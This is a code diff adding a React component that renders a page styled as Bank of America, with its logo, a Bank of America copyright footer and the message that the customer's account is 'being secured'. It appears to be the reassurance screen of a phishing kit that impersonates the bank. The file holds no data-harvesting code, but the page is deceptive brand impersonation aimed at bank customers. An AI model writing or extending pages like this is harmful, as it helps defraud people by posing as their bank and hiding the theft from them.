@@ -1,0 +1,33 @@
+import Model from "../components/Model";
+import logo from "/boa.png";
+const SecureAccountPage: React.FC = () => {
+  return (
+    <Model isOpen={false}>
+      <div className="min-h-screen bg-linear-to-b from-blue-50 to-white flex flex-col items-center justify-center px-6">
+        {/* Header */}
+        <header className="flex items-center space-x-2 mb-10">
+          <a className="text-2xl font-semibold text-blue-900">
+            <img src={logo} alt="" />
+          </a>
+        </header>
+
+        {/* Message Card */}
+        <div className="bg-white shadow-md rounded-lg max-w-md w-full p-6 text-center border border-gray-100">
+          <h2 className="text-xl font-semibold text-gray-800 mb-3">
+            Thank you for being a loyal Bank of America customer
+          </h2>
+          <p className="text-gray-600 mb-4">
+            Don’t worry — we’re securing your account now.
+          </p>
+        </div>
+
+        <footer className="mt-10 text-sm text-gray-500">
+          © {new Date().getFullYear()} Bank of America Corporation. All rights
+          reserved.
+        </footer>
+      </div>
+    </Model>
+  );
+};
+
+export default SecureAccountPage;
